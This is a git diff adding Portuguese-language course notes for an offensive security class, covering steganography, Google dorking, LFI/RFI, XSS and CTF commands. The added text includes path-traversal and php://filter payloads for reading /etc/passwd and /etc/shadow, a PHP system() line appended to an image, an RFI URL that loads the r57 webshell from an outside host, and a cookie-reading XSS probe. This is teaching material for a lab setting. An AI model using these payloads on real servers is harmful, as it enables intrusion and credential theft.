@@ -17,6 +17,24 @@ Roteiros e Resumo da disciplina Tecnologias Hacker
 - Possibilitar que o destinatário identifique o remetente da mensagem
 - Assinatura Digital
 
+## ESTEGNOGRAFIA
+
+Esteganografia é uma técnica que consiste em esconder um arquivo dentro do outro, de forma criptografada.
+
+- steghide (comando para aplicar uma Estegnografia): suporte para jpeg, bmp, wav e au.
+
+Embedar um arquivo em uma imagem:
+
+```cmd
+steghide embed -cf IMAGEM -ef TEXTO
+```
+
+Extrair arquivo de uma imagem
+
+```cmd
+steghide extract -sf ARQUIVO
+```
+
 ### Exemplos de algorítimo
 
 - Cifragem por substituição:
@@ -64,7 +82,7 @@ Framework que mostra ferramentas disponíveis para coletar informações nos mai
 
 ### Google Dork
 
-Utilização de mecanismos de pesquisa para encontrar informações na internet, utilizando a ferramenta de pesquisa do Google.
+Utilização de mecanismos de pesquisa para encontrar informações na internet, utilizando a ferramenta de pesquisa do Google. (https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06#file-googledorking-md)
 
 Operadores:
 
@@ -75,12 +93,21 @@ Operadores:
 - Unir diferentes operadores. Ex: site:twitter.com "Rodolfo Avelino"
 - Sinal de menos para excluir termo. Ex: cloroquina -covid
 - Busca por string em url (endereço): EX: inurl: Index of /logs
+- Busca por texto: EX: intext "indexof" ".sql"
 
 Busca Booleana
 
 - AND: pesquisar dois ou mais termos simultaneamente. Espaço em branco também faz esse papel. Ex: "Ransomware" AND "TV Record";
 - OR ou pipeline (|): pesquisar um ou outro termo "Rodolfo Avelino" OR Avelinux;
 - Parênteses para isolar o termo. Ex: (cloroquina OR ivermectina) AND (pandemia OR covid)
+
+Exemplos importantes:
+
+Buscar vulnerabilidades com LFI:
+
+```
+inurl:"index.php?page="
+```
 
 ### Exbloit DB
 
@@ -90,10 +117,96 @@ https://www.exploit-db.com/google-hacking-database
 
 ---
 
+## LFI (Local File Inclusion) e RFI (Remote File Inclusion)
+
+Inclusão de arquivos em servidores, de tal forma que se torna possível ter acessos de dados do Servidor. O LFI utiliza arquivos locais, já o RFI utiliza arquivos em sorvidores comprometidos. As URLs que costumam ser alvo de ataques, terminam com:
+
+- p=
+- page=
+- site=
+- content=
+
+**Exemplo de LFI:** adicionar após `/?page==` a estrutura de pastas `../../../../../../../../etc/passwd`, a fim de obter o arquivo passwd:
+
+```cmd
+http://localhost:8000/vulnerabilities/fi/?page==../../../../../../../../etc/passwd
+```
+
+Para obter esse valor, com conversão base64 (para conseguir passar o filtro que alguns servidores colocam)
+
+```cmd
+http://localhost:8000/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/etc/passwd
+```
+
+Outros arquivos explorados em ataques:
+
+- /etc/issue
+- /proc/version
+- /etc/profile
+- /etc/passwd
+- /etc/shadow
+- /root/.bash_history
+- /var/spool/cron/crontabs/root
+
+**Exemplo de RFI:** contaminar um servidor comprometido com um arquivo com metadados que tentam executar ou obter informações comprometidas dele.
+
+Criar imagem para contaminar um servidor
+
+```cmd
+convert -size 32x32 xc:blue aula.png
+```
+
+Observar metadados de arquivos
+
+```cmd
+hexdump -C aula.png
+```
+
+Passar metadados para o arquivo: comando para observar o arquivo de passwd de uma servidor
+
+```cmd
+echo "<?php system('cat /etc/passwd'); ?>" >> aula.png
+```
+
+Com o RFI também é possível fazer injeção de Shells para execução de comandos dentro do servidor:
+
+```cmd
+http://IPALVO/index.php?page=https://57.webshellarchive.org/r57.txt
+```
+
+## XSS (Reflected and Stored)
+
+- Reflected: não fica salvo para todos os usuários
+- Stored: Permanece para os outros usuários
+
+Uma maneira de rodar comandos dentro de um servidor vulnerável. É possível inserir scripts em inputs, se não for feito a sanetização correta.
+
+```cmd
+<script>alert(document.cookie)</script>
+```
+
 ## Comandos importantes
 
-Listar diretórios de uma site
+Listar diretórios de um site
 
 ```cmd
 wget --spider -r --no-parent www.insper.edu.br
 ```
+
+Utilizar o comando find para encontrar as flags
+
+```cmd
+find / -user flag -perm -u=s 2>/dev/null
+```
+
+```cmd
+find ~/ -type f -name "*.py"
+```
+
+## Clientes importantes
+
+- porta ftp: https://www.makeuseof.com/best-ftp-clients-for-linux/ (FileZila)
+
+- porta smb: No Gerenciados de Arquivos (Files), ir em:
+  - Other Locations
+  - Em `connect to server` digitar: smb://{ip_alvo}
